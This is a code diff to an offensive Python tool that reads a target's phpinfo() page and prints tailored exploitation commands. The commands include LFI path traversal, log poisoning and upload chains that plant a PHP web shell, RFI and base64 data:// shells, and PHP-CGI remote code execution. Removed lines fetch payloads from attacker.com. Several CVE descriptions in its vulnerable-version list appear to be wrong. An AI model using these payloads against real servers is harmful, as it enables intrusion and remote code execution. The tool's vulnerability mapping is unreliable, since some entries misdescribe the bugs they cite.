@@ -28,17 +28,65 @@ init(autoreset=True)
 
 # Known vulnerable PHP versions (version prefix, vulnerability note).
 KNOWN_VULNERABLE_VERSIONS = [
-    ("5.2.10", "PHP 5.2.10 is very outdated (EOL since 2011) and is known to be vulnerable to LFI/RCE exploits."),
-    ("5.2.13", "PHP 5.2.13 has known vulnerabilities that may lead to code execution."),
-    ("5.2.17", "PHP 5.2.17 still has documented vulnerabilities that could lead to RCE."),
-    ("5.4.0", "PHP 5.4.0 (especially in CGI mode) is vulnerable to PHP-CGI argument injection (CVE-2012-1823)."),
-    ("5.4.1", "PHP 5.4.1 shares similar vulnerabilities as 5.4.0 in CGI mode."),
-    ("5.4.2", "PHP 5.4.2 is vulnerable to the PHP-CGI argument injection vulnerability (CVE-2012-1823)."),
-    ("5.0",   "PHP 5.0 is end-of-life and has multiple vulnerabilities, including those that can lead to RCE."),
-    ("5.1",   "PHP 5.1 is no longer maintained and has several known vulnerabilities."),
-    ("5.2",   "PHP 5.2 series is outdated and has known vulnerabilities (RCE/LFI) if not patched properly."),
-    ("5.3",   "Early PHP 5.3 releases (e.g., 5.3.0 to 5.3.3) may be vulnerable if misconfigured."),
-    ("4.",    "PHP 4 is end-of-life and vulnerable to many exploits including RCE."),
+    # PHP 8.x Vulnerabilities
+    ("8.1.0-dev", "PHP 8.1.0-dev had a backdoor incident (March 2021) allowing RCE via User-Agentt header"),
+    ("8.0.0", "Early PHP 8.0.x versions had multiple vulnerabilities including potential RCE via OPcache"),
+    
+    # PHP 7.x Vulnerabilities
+    ("7.4.21", "PHP < 7.4.21 vulnerable to buffer overflow in array_walk()/array_walk_recursive() (CVE-2021-21705)"),
+    ("7.3.33", "PHP < 7.3.33 vulnerable to DOS and potential RCE via multibyte conversion (CVE-2021-21702)"),
+    ("7.2.34", "PHP < 7.2.34 vulnerable to potential RCE via session deserialization (CVE-2019-11043)"),
+    ("7.1.33", "PHP < 7.1.33 vulnerable to heap buffer overflow in mb_ereg_replace() (CVE-2019-11041)"),
+    ("7.0.33", "PHP < 7.0.33 vulnerable to RCE via imap_open() (CVE-2018-19518)"),
+    
+    # PHP 5.x Critical Vulnerabilities
+    ("5.6.40", "PHP 5.6.40 and below are EOL, multiple RCE vulnerabilities including CVE-2019-11043"),
+    ("5.5.38", "PHP 5.5.38 vulnerable to multiple RCEs including fastcgi fpm (CVE-2016-5385)"),
+    ("5.4.45", "PHP 5.4.45 vulnerable to multiple RCEs including CVE-2016-5773 (str_repeat)"),
+    ("5.4.0", "PHP 5.4.0 CGI query string parameter vulnerability allows RCE (CVE-2012-1823)"),
+    ("5.3.29", "PHP 5.3.29 vulnerable to RCE via heap corruption in exif_thumbnail_extract()"),
+    ("5.3.12", "PHP 5.3.12 vulnerable to RCE via apache_child_terminate() (CVE-2012-2311)"),
+    ("5.3.9", "PHP 5.3.9 vulnerable to hash collision DOS and CGI RCE (CVE-2011-4885)"),
+    ("5.3.7", "PHP 5.3.7 has critical LFI vulnerability in error_log() function"),
+    ("5.3.6", "PHP 5.3.6 vulnerable to RCE via curl_setopt() (CVE-2011-3182)"),
+    ("5.3.0", "PHP 5.3.0 has multiple LFI/RFI vulnerabilities including realpath bypass"),
+    
+    # PHP 5.2.x Series (Highly Vulnerable)
+    ("5.2.17", "PHP 5.2.17 vulnerable to multiple RCEs including phpinfo() exploit (CVE-2011-3268)"),
+    ("5.2.14", "PHP 5.2.14 vulnerable to RCE via safe_mode bypass (CVE-2010-2531)"),
+    ("5.2.12", "PHP 5.2.12 vulnerable to RCE via substr_compare() (CVE-2010-1917)"),
+    ("5.2.10", "PHP 5.2.10 vulnerable to RCE via session handling (CVE-2009-4143)"),
+    ("5.2.9", "PHP 5.2.9 vulnerable to RCE via posix_mkfifo() (CVE-2009-2687)"),
+    ("5.2.0", "PHP 5.2.0 has multiple critical vulnerabilities including LFI via include()"),
+    
+    # PHP 5.1.x and 5.0.x (Ancient, Multiple Vulnerabilities)
+    ("5.1.6", "PHP 5.1.6 vulnerable to RCE via unserialize() (CVE-2007-1581)"),
+    ("5.1.2", "PHP 5.1.2 has critical RCE via GD extension (CVE-2006-4625)"),
+    ("5.1.0", "PHP 5.1.0 vulnerable to multiple RCEs including mail() injection"),
+    ("5.0.5", "PHP 5.0.5 vulnerable to RCE via zip extension (CVE-2006-2563)"),
+    ("5.0.4", "PHP 5.0.4 vulnerable to RCE via PCRE (CVE-2006-1549)"),
+    ("5.0.0", "PHP 5.0.0 has numerous RCE vulnerabilities including memory corruption"),
+    
+    # PHP 4.x (Extremely Outdated and Vulnerable)
+    ("4.4.9", "PHP 4.4.9 multiple RCE vulnerabilities including memory corruption"),
+    ("4.4.0", "PHP 4.4.0 vulnerable to multiple RCEs including format string attacks"),
+    ("4.3.11", "PHP 4.3.11 vulnerable to RCE via multiple vectors including memory corruption"),
+    ("4.3.0", "PHP 4.3.0 has critical vulnerabilities including RCE via file upload"),
+    ("4.2.0", "PHP 4.2.0 vulnerable to multiple RCEs including register_globals abuse"),
+    ("4.1.0", "PHP 4.1.0 has numerous security issues including RCE via global variables"),
+    ("4.0.0", "PHP 4.0.0 multiple critical vulnerabilities including RCE via include()"),
+    
+    # Generic Version Checks
+    ("8.", "PHP 8.x - Check for known vulnerabilities and misconfigurations"),
+    ("7.", "PHP 7.x - Check for known vulnerabilities and CGI/FastCGI misconfigurations"),
+    ("5.6", "PHP 5.6.x is EOL - Multiple known vulnerabilities including potential RCE"),
+    ("5.5", "PHP 5.5.x is EOL - Multiple RCE vulnerabilities if unpatched"),
+    ("5.4", "PHP 5.4.x is EOL - Known CGI RCE vulnerabilities (CVE-2012-1823)"),
+    ("5.3", "PHP 5.3.x is EOL - Multiple RCE and LFI vulnerabilities"),
+    ("5.2", "PHP 5.2.x is EOL - Numerous RCE, LFI, and RFI vulnerabilities"),
+    ("5.1", "PHP 5.1.x is EOL - Critical RCE and file inclusion vulnerabilities"),
+    ("5.0", "PHP 5.0.x is EOL - Multiple critical RCE vulnerabilities"),
+    ("4.", "PHP 4.x is extremely outdated - Multiple critical vulnerabilities")
 ]
 
 ### PARSING FUNCTIONS ###
@@ -313,126 +361,124 @@ def generate_config_attack_mapping(config):
 
 def generate_exploitation_suggestions(config, streams, target_url):
     """
-    Generate customized exploitation test suggestions based on scan results.
+    Generate focused exploitation suggestions with improved formatting.
     """
     suggestions = []
-    # 1. Local File Inclusion (LFI)
-    if (config.get("allow_url_fopen", "").lower() == "on" and 
-        config.get("open_basedir", "").lower() in ["", "no value", "none"] and 
-        config.get("disable_functions", "").lower() in ["", "no value"]):
-        suggestions.append(f"{Fore.MAGENTA}Local File Inclusion (LFI):{Style.RESET_ALL} Conditions are ideal for LFI.")
-        suggestions.append(f"    - Test: curl -s \"{target_url}?file=../../../../etc/passwd\"")
-        suggestions.append(f"    - Test: curl -s \"{target_url}?file=../../../../proc/self/environ\"")
-        suggestions.append(f"    - Test: curl -s \"{target_url}?file=../../../../var/log/apache2/access.log\"")
-        suggestions.append("    - Also check PHP session files (e.g., /var/lib/php/sessions/sess_<session_id>).")
-    else:
-        suggestions.append(f"{Fore.MAGENTA}Local File Inclusion (LFI):{Style.RESET_ALL} Conditions are not fully optimal; review allow_url_fopen, open_basedir, and disable_functions.")
-    
-    # 2. Remote File Inclusion (RFI)
+
+    # 1. LFI Tests
+    if (config.get("allow_url_fopen", "").lower() == "on" or 
+        config.get("open_basedir", "").lower() in ["", "no value", "none"]):
+        suggestions.append(f"\n{Fore.MAGENTA}[+] LFI VECTORS{Style.RESET_ALL}")
+        suggestions.append(f"{Fore.YELLOW}Basic LFI Tests:{Style.RESET_ALL}")
+        suggestions.append(f"  curl '{target_url}?page=../../../etc/passwd'")
+        suggestions.append(f"  curl '{target_url}?page=../../../proc/self/environ'")
+        
+        if "php" in streams:
+            suggestions.append("\n    PHP Filter LFI:")
+            suggestions.append(f"    curl '{target_url}?page=php://filter/convert.base64-encode/resource=index.php'")
+            suggestions.append(f"    curl '{target_url}?page=php://filter/convert.base64-encode/resource=config.php'")
+        
+        suggestions.append("\n    Log Poisoning:")
+        suggestions.append(f"    curl '{target_url}' -H '<?php system($_GET[\"cmd\"]); ?>'")
+        suggestions.append(f"    curl '{target_url}?page=../../../var/log/apache2/access.log&cmd=id'")
+
+    # 2. RFI Tests - If Enabled
     if config.get("allow_url_include", "").lower() == "on":
-        suggestions.append(f"{Fore.MAGENTA}Remote File Inclusion (RFI):{Style.RESET_ALL} allow_url_include is enabled.")
-        suggestions.append(f"    - Test: curl -s \"{target_url}?file=http://your-server.com/shell.php\"")
-        suggestions.append("    - Advanced RFI: Use PHP wrappers for code execution:")
-        suggestions.append(f"      curl -s \"{target_url}?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=\"")
-        suggestions.append(f"      curl -s \"{target_url}?file=expect://id\" (if expect stream enabled)")
-    else:
-        suggestions.append(f"{Fore.MAGENTA}Remote File Inclusion (RFI):{Style.RESET_ALL} Direct RFI is unlikely since allow_url_include is disabled, but indirect methods may exist via allow_url_fopen.")
-    
-    # 3. PHP Streams Abuse
-    if streams:
-        suggestions.append(f"{Fore.MAGENTA}PHP Streams Abuse for LFI:{Style.RESET_ALL} Try using php://filter to bypass restrictions.")
-        suggestions.append(f"    - Test: curl -s \"{target_url}?file=php://filter/convert.base64-encode/resource=/etc/passwd\"")
-        suggestions.append(f"    - Test: curl -s \"{target_url}?file=zip://shell.zip%23shell.php\" (if applicable)")
-        if "phar" in streams:
-            suggestions.append("    - PHAR Deserialization: Create malicious PHAR with phpggc and include via phar://")
-    else:
-        suggestions.append(f"{Fore.MAGENTA}PHP Streams Abuse for LFI:{Style.RESET_ALL} No streams data available; verify manually.")
-    
-    # 4. Command Execution via PHP
+        suggestions.append(f"\n{Fore.MAGENTA}RFI Tests:{Style.RESET_ALL}")
+        suggestions.append("    Host this file on your server (shell.php):")
+        suggestions.append("    <?php system($_GET['cmd']); ?>")
+        suggestions.append("\n    Then try:")
+        suggestions.append(f"    curl '{target_url}?page=http://YOUR-IP/shell.php&cmd=id'")
+        
+        if "data" in streams:
+            suggestions.append("\n    Data Wrapper RFI:")
+            suggestions.append(f"    curl '{target_url}?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8%2B&cmd=id'")
+
+    # 3. File Upload + LFI Chain
+    if config.get("file_uploads", "").lower() == "on":
+        suggestions.append(f"\n{Fore.MAGENTA}File Upload + LFI Chain:{Style.RESET_ALL}")
+        suggestions.append("    1. Create shell.php:")
+        suggestions.append("    <?php system($_GET['cmd']); ?>")
+        suggestions.append("\n    2. Try uploading with different extensions:")
+        suggestions.append("    .php, .php.jpg, .php;.jpg, .php%00.jpg, .php.jpeg, .php5, .phtml")
+        suggestions.append("\n    3. If upload successful, try including via LFI:")
+        upload_path = config.get("upload_tmp_dir", "/tmp")
+        suggestions.append(f"    curl '{target_url}?page={upload_path}/shell.php&cmd=id'")
+
+    # 4. PHP Object Injection (if vulnerable version detected)
+    if "phar" in streams and any(v in config.get("PHP_Version", "") for v in ["5.", "7.0", "7.1"]):
+        suggestions.append(f"\n{Fore.MAGENTA}PHP Object Injection via PHAR:{Style.RESET_ALL}")
+        suggestions.append("    1. Create malicious PHAR file with PHPGGC")
+        suggestions.append("    2. Upload it with image extension (exploit.jpg)")
+        suggestions.append(f"    3. curl '{target_url}?page=phar://path/to/uploads/exploit.jpg'")
+
+    # 5. Command Injection (if dangerous functions enabled)
     if config.get("disable_functions", "").lower() in ["", "no value"]:
-        suggestions.append(f"{Fore.MAGENTA}Command Execution via PHP:{Style.RESET_ALL} No dangerous functions are disabled.")
-        suggestions.append("    - Test: Insert a payload such as <?php system('id'); ?> via a parameter.")
-        suggestions.append("    - Test LD_PRELOAD bypass with curl:")
-        suggestions.append("      curl -s --data '<?php echo shell_exec(\"curl http://attacker.com/exploit.so -o /tmp/exploit.so && LD_PRELOAD=/tmp/exploit.so php -r \'echo 1;\'\")?>' \"{target_url}\"")
-    else:
-        suggestions.append(f"{Fore.MAGENTA}Command Execution via PHP:{Style.RESET_ALL} Some functions are enabled; consider bypass techniques.")
-        suggestions.append("    - Bypass techniques: Try pcntl_exec, FFI, COM objects (Windows), or ImageMagick delegates.")
-    
-    # 5. SSRF
-    if any(s in streams for s in ["http", "ftp", "ftps", "tcp"]):
-        suggestions.append(f"{Fore.MAGENTA}Server-Side Request Forgery (SSRF):{Style.RESET_ALL} Registered streams indicate SSRF potential.")
-        suggestions.append(f"    - Test: curl -s \"{target_url}?file=http://127.0.0.1/admin\"")
-        suggestions.append(f"    - Test: curl -s \"{target_url}?file=ftp://127.0.0.1/etc/passwd\"")
-    else:
-        suggestions.append(f"{Fore.MAGENTA}Server-Side Request Forgery (SSRF):{Style.RESET_ALL} No clear SSRF-capable streams detected; review manually.")
-    
-    # 6. PHP-CGI Exploits
-    if config.get("Server_API", "").lower().startswith("cgi"):
-        suggestions.append(f"{Fore.MAGENTA}PHP-CGI Vulnerability (CVE-2012-1823):{Style.RESET_ALL}")
-        suggestions.append(f"    - Test source disclosure: curl '{target_url}?-s'")
-        suggestions.append(f"    - Attempt RCE: curl '{target_url}?-d allow_url_include=1 -d auto_prepend_file=http://attacker.com/shell.txt'")
-    
-    # 7. XDebug Exploits
-    if config.get("xdebug.remote_enable", "").lower() == "on":
-        suggestions.append(f"{Fore.MAGENTA}XDebug Remote Code Execution:{Style.RESET_ALL}")
-        suggestions.append("    - Test with xdebug-utils: https://github.com/nqxcode/xdebug-exploit")
-    
-    # 8. Session Hijacking
-    if "session.save_path" in config:
-        suggestions.append(f"{Fore.MAGENTA}Session File Hijacking:{Style.RESET_ALL} Predict session IDs and try reading session files:")
-        suggestions.append(f"    - Test: curl '{target_url}?file={config['session.save_path']}/sess_1234567890'")
-    
+        suggestions.append(f"\n{Fore.MAGENTA}Command Injection Tests:{Style.RESET_ALL}")
+        suggestions.append("    Try these PHP functions:")
+        suggestions.append("    system(), exec(), shell_exec(), passthru()")
+        suggestions.append("\n    Example payloads:")
+        suggestions.append(f"    curl '{target_url}?cmd=system(\"id\");'")
+        suggestions.append(f"    curl '{target_url}' --data 'cmd=passthru(\"id\");'")
+
+    # 6. CGI/FastCGI RCE (if detected)
+    if config.get("Server_API", "").lower().startswith(("cgi", "fast")):
+        suggestions.append(f"\n{Fore.MAGENTA}CGI/FastCGI RCE:{Style.RESET_ALL}")
+        suggestions.append("    Try PHP-CGI RCE (CVE-2012-1823):")
+        suggestions.append(f"    curl '{target_url}?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input' -d '<?php system(\"id\"); ?>'")
+        suggestions.append(f"    curl '{target_url}?-s' # Source code disclosure")
+
     return suggestions
 
 def generate_additional_suggestions(config, html, target_url):
     """
     Generate extra suggestions based on additional environment details.
+    Improved formatting for readability.
     """
     suggestions = []
-    # OS & Server Details.
+    
+    # OS & Server Details
     os_details = extract_os_details(html)
     if os_details:
-        suggestions.append(f"{Fore.MAGENTA}OS & Server Details:{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}{os_details}{Style.RESET_ALL}")
-        suggestions.append(f"    - Test: Run 'curl -I {target_url}' to check server headers for version info.")
-    else:
-        suggestions.append(f"{Fore.MAGENTA}OS & Server Details:{Style.RESET_ALL} Not detected from phpinfo; try 'curl -I {target_url}' manually.")
+        suggestions.append(f"{Fore.LIGHTCYAN_EX}OS & Server Details:{Style.RESET_ALL} {os_details}")
+        suggestions.append(f"    Test: Run 'curl -I {target_url}' to check server headers for version info.")
     
-    # Additional .ini Files.
+    # Additional .ini Files
     additional_ini = extract_additional_ini_files(html)
     if additional_ini:
-        suggestions.append(f"{Fore.MAGENTA}Additional .ini Files Parsed:{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}{additional_ini}{Style.RESET_ALL}")
-        suggestions.append("    - Action: Check these files for sensitive data (e.g., database credentials).")
-    else:
-        suggestions.append(f"{Fore.MAGENTA}Additional .ini Files Parsed:{Style.RESET_ALL} None detected.")
+        suggestions.append(f"{Fore.LIGHTCYAN_EX}Additional .ini Files:{Style.RESET_ALL}")
+        ini_files = [file.strip() for file in additional_ini.split(',')]
+        for ini_file in ini_files:
+            suggestions.append(f"    {ini_file}")
+        suggestions.append("    Action: Check these files for sensitive data (e.g., database credentials).")
     
-    # File Upload Settings.
+    # File Upload Settings
     file_uploads = config.get("file_uploads", "").lower()
     if file_uploads == "on":
-        suggestions.append(f"{Fore.MAGENTA}File Uploads:{Style.RESET_ALL} Enabled.")
-        suggestions.append("    - Test: Attempt to upload a PHP shell using a POST request (e.g., curl -F).")
+        suggestions.append(f"{Fore.LIGHTCYAN_EX}File Uploads:{Style.RESET_ALL} Enabled")
+        suggestions.append("    Test: Attempt to upload a PHP shell using a POST request (e.g., curl -F)")
         max_size = config.get("upload_max_filesize", "2M")
-        suggestions.append(f"    - Sample curl (adjust size to {max_size}):")
-        suggestions.append(f'      curl -F "file=@shell.php" -F "submit=1" {target_url}')
-    else:
-        suggestions.append(f"{Fore.MAGENTA}File Uploads:{Style.RESET_ALL} Disabled or not detected.")
+        suggestions.append(f"    Sample curl (adjust size to {max_size}):")
+        suggestions.append(f'    curl -F "file=@shell.php" -F "submit=1" {target_url}')
     
-    # Temporary Upload Directory.
+    # Upload Directory
     if "upload_tmp_dir" in config:
-        suggestions.append(f"{Fore.MAGENTA}Upload Temp Directory:{Style.RESET_ALL} Check for leftover files: {config['upload_tmp_dir']}/*")
+        suggestions.append(f"{Fore.LIGHTCYAN_EX}Upload Temp Directory:{Style.RESET_ALL} Check for leftover files: {config['upload_tmp_dir']}/*")
     
-    # Credential Disclosure.
+    # Credential Files
     if additional_ini:
-        for ini in additional_ini.split(","):
-            if any(keyword in ini.lower() for keyword in ["mysql", "pdo"]):
-                suggestions.append(f"{Fore.MAGENTA}Credential Disclosure:{Style.RESET_ALL} {ini.strip()} may contain database credentials. Test via LFI.")
+        suggestions.append(f"{Fore.LIGHTCYAN_EX}Potential Credential Files:{Style.RESET_ALL}")
+        for ini_file in ini_files:
+            if any(keyword in ini_file.lower() for keyword in ["mysql", "pdo"]):
+                suggestions.append(f"    {ini_file}")
     
-    # Deserialization Issues.
-    suggestions.append(f"{Fore.MAGENTA}Deserialization Issues:{Style.RESET_ALL} Check for insecure usage of unserialize() beyond PHAR deserialization vulnerabilities.")
+    # Deserialization
+    suggestions.append(f"{Fore.LIGHTCYAN_EX}Deserialization Issues:{Style.RESET_ALL} Check for insecure usage of unserialize() beyond PHAR deserialization vulnerabilities")
     
-    # Environment Variables.
+    # Environment Variables
     if "Environment" in html:
-        suggestions.append(f"{Fore.MAGENTA}Environment Variables:{Style.RESET_ALL} Check $_ENV for credentials via LFI.")
-    
+        suggestions.append(f"{Fore.LIGHTCYAN_EX}Environment Variables:{Style.RESET_ALL} Check $_ENV for credentials via LFI")
+
     return suggestions
 
 ### MARKDOWN REPORT GENERATION ###
@@ -562,13 +608,17 @@ def print_and_save_output(config, attacks, config_mapping, stream_messages, stre
 ### MAIN FUNCTION ###
 
 def main():
-    parser = argparse.ArgumentParser(description="PHPInfo Attack Path Analyzer with Enhanced Checks and Exploitation Suggestions (Dual Output)")
+    parser = argparse.ArgumentParser(description="PHPInfo Attack Path Analyzer with Enhanced Checks and Exploitation Suggestions")
     parser.add_argument("--url", required=True, help="URL to the phpinfo() page")
+    parser.add_argument("--outdir", default=".", help="Output directory for reports (default: current directory)")
     args = parser.parse_args()
 
-    # Extract hostname for output filenames.
-    parsed_url = urlparse(args.url)
-    hostname = parsed_url.netloc.replace(":", "_")
+    # Create output directory if it doesn't exist
+    try:
+        os.makedirs(args.outdir, exist_ok=True)
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error creating output directory: {e}{Style.RESET_ALL}")
+        sys.exit(1)
 
     print(f"{Fore.BLUE}[*] Fetching phpinfo() page from: {args.url}")
     html = fetch_phpinfo(args.url)
@@ -618,10 +668,12 @@ def main():
     extra_suggestions = generate_additional_suggestions(config, html, args.url)
     suggestions.extend(extra_suggestions)
 
-    # Generate output filenames.
+    # Generate output filenames with specified directory
+    parsed_url = urlparse(args.url)
+    hostname = parsed_url.netloc.replace(":", "_")
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    output_filename = f"phpinfo_attack_paths_{hostname}_{timestamp}.txt"
-    markdown_filename = f"phpinfo_attack_paths_{hostname}_{timestamp}.md"
+    output_filename = os.path.join(args.outdir, f"phpinfo_attack_paths_{hostname}_{timestamp}.txt")
+    markdown_filename = os.path.join(args.outdir, f"phpinfo_attack_paths_{hostname}_{timestamp}.md")
 
     print_and_save_output(config, attacks, config_mapping, stream_messages, stream_attack_paths, suggestions, output_filename, markdown_filename)
 
